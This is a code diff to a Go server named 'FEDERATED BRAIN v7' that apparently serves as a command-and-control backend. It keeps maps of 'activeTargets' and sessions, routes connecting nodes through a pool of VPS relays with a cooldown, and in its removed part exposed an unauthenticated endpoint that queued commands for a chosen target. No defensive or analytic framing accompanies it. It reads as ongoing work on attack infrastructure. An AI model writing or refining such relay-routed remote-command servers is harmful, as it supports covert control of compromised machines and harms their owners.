@@ -5,7 +5,6 @@ import (
 	"fmt"
 	"math/rand"
 	"net"
-	"net/http"
 	"strings"
 	"sync"
 	"time"
@@ -31,43 +30,27 @@ var (
 )
 var relayCooldown = make(map[string]time.Time)
 
-func startDashboardAPI() {
-	http.HandleFunc("/api/nodes", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Content-Type", "application/json")
-		w.Header().Set("Access-Control-Allow-Origin", "*")
-
-		mu.Lock()
-		defer mu.Unlock()
-		// This works here because the Brain actually owns these maps!
-		json.NewEncoder(w).Encode(activeTargets)
-	})
-
-	http.HandleFunc("/api/command", func(w http.ResponseWriter, r *http.Request) {
-		w.Header().Set("Access-Control-Allow-Origin", "*")
-		targetID := r.URL.Query().Get("id")
-		cmd := r.URL.Query().Get("cmd")
-
-		mu.Lock()
-		activeSessions[strings.ToUpper(targetID)] = cmd
-		mu.Unlock()
-
-		fmt.Fprintf(w, "Command %s queued", cmd)
-	})
-
-	fmt.Println("[WEB] Dashboard API listening on :9000")
-	http.ListenAndServe(":9000", nil)
-}
 func main() {
 	rand.Seed(time.Now().UnixNano())
-	ln, _ := net.Listen("tcp", ":8080")
+
+	// 2. Start the TCP Listener
+	ln, err := net.Listen("tcp", ":8080")
+	if err != nil {
+		fmt.Println("[!] Failed to bind 8080:", err)
+		return
+	}
+
 	fmt.Println("==========================================")
 	fmt.Println("   FEDERATED BRAIN v7 - STABILITY FIX   ")
 	fmt.Println("==========================================")
 
 	for {
-		conn, _ := ln.Accept()
+		conn, err := ln.Accept()
+		if err != nil {
+			continue
+		}
+		// Handle each connection in its own thread
 		go handleConnection(conn)
-		go startDashboardAPI()
 	}
 }
 
@@ -104,11 +87,9 @@ func handleConnection(conn net.Conn) {
 		if len(relayPool) == 0 {
 			return
 		}
-		// Pick a random VPS from the pool
-		selectedRelay := relayPool[rand.Intn(len(relayPool))]
-		activeSessions[id] = selectedRelay
-		json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: selectedRelay})
-		fmt.Printf("[>] Session Set: %s -> %s\n", id, selectedRelay)
+
+		var selectedRelay string
+		// Find a relay that isn't on cooldown
 		for _, r := range relayPool {
 			if time.Since(relayCooldown[r]) > 2*time.Second {
 				selectedRelay = r
@@ -116,6 +97,15 @@ func handleConnection(conn net.Conn) {
 				break
 			}
 		}
+
+		// Fallback: If all are on cooldown, just pick one at random anyway
+		if selectedRelay == "" {
+			selectedRelay = relayPool[rand.Intn(len(relayPool))]
+		}
+
+		activeSessions[id] = selectedRelay
+		json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: selectedRelay})
+		fmt.Printf("[>] Session Set: %s -> %s\n", id, selectedRelay)
 	case "client_poll":
 		if addr, exists := activeSessions[id]; exists {
 			json.NewEncoder(conn).Encode(RoutingInfo{RelayAddr: addr})
